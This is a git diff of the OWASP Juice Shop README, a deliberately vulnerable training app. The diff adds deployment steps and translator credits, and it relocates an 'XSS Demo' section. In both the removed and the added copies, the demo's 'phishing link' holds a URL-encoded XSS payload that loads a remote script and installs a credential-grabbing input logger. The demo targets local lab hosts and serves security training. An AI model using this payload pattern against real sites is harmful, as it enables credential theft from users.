@@ -29,7 +29,9 @@ overview please visit the official project page:
 
 ### Deploy on Heroku (free ($0/month) dyno)
 
-1. Click the button below and follow the instructions
+1. [Sign up to Heroku](https://signup.heroku.com/) and
+   [log in to your account](https://id.heroku.com/login)
+2. Click the button below and follow the instructions
 
 [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
 
@@ -58,8 +60,9 @@ overview please visit the official project page:
 2. Download `juice-shop-<version>_<node-version>_<os>_x64.zip` (or
    `.tgz`) attached to
    [latest release](https://github.com/bkimminich/juice-shop/releases/latest)
-3. Unpack and run `npm start` in unpacked folder
-4. Browse to <http://localhost:3000>
+3. Unpack and `cd` into the unpacked folder
+4. Run `npm start`
+5. Browse to <http://localhost:3000>
 
 > Each packaged distribution includes some binaries for SQLite bound to
 > the OS and node.js version which `npm install` was executed on.
@@ -88,6 +91,15 @@ overview please visit the official project page:
 3. Click on the _Open_ icon next to _Web Preview_ to browse to OWASP
    Juice Shop
 
+#### Deploy to Docker Cloud (:microscope:)
+
+1. Click the button below and follow the instructions
+
+[![Deploy to Docker Cloud](https://files.cloud.docker.com/images/deploy-to-dockercloud.svg)](https://cloud.docker.com/stack/deploy/)
+
+> This (:microscope:) is an experimental deployment option! Your
+> feedback is appreciated at <https://gitter.im/bkimminich/juice-shop>.
+
 ### Vagrant
 
 1. Install [Vagrant](https://www.vagrantup.com/downloads.html) and
@@ -97,18 +109,6 @@ overview please visit the official project page:
    of the repository)
 3. Run `cd vagrant && vagrant up`
 4. Browse to [192.168.33.10](http://192.168.33.10)
-
-> To show the possible impact of
-> [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)),
-> assume you received and (of course) clicked
-> [this inconspicuous phishing link](http://192.168.33.10/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2F192.168.33.10%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
-> and login. Apart from the visual/audible effect, the attacker also
-> installed [an input logger](http://192.168.33.10/logger.php) to grab
-> credentials! This could easily run on a 3rd party server in real life!
->
-> _This feature is only available when running a Vagrant box. A
-> recording of the effect is available on Youtube:_
-> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
 
 ### Amazon EC2 Instance
 
@@ -195,6 +195,20 @@ tool.
 For step-by-step instructions and examples please refer to
 [the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
 of our companion guide ebook.
+
+## XSS Demo
+
+To show the possible impact of
+[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
+can download this
+[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
+and run `docker-compose up` to start the juice-shop and the
+shake-logger. Assume you received and (of course) clicked
+[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
+and login. Apart from the visual/audible effect, the attacker also
+installed [an input logger](http://localhost:8080/logger.php) to grab
+credentials! This could easily run on a 3rd party server in real life!
+
 
 ## Additional Documentation
 
@@ -351,11 +365,12 @@ Based on [CrowdIn](https://crowdin.com/project/owasp-juice-shop)
 translations and commits to `app/i18n`. Grouped by language as of Fri,
 13 Apr 2018 on `develop`.
 
+- :uae: Oussama Bouthouri
 - :brazil: sergio.kubota
 - :cn: Coink, rToxic
 - :czech_republic: Martin Hartl, stejkenzie
 - :denmark: Allan Kimmer Jensen, owangen, Rasmus Bidstrup
-- :estonia: bmoritz, janesmae
+- :estonia: bmoritz, janesmae, Egert Aia, spruur, rakzcs
 - :finland: Nico Ådahl
 - :fr: Kylian Runembert, vientspam, Simon Basset
 - :de: Björn Kimminich
@@ -365,7 +380,7 @@ translations and commits to `app/i18n`. Grouped by language as of Fri,
 - :indonesia: adeyosemanputra, bahrunghozali, kahfiehudson, Mohammad
   Febri Ramadlan, Rick Daalhuizen, Syahrol
 - :israel: AviD, Omer Levi Hevroni
-- :it: vientspam
+- :it: vientspam, Claudio Snidero
 - :jp: ninoseki, nilfigo
 - :myanmar: thinbashane
 - :netherlands: Bart Decker, Daan Sprenkels, Manu B, rachidbm,
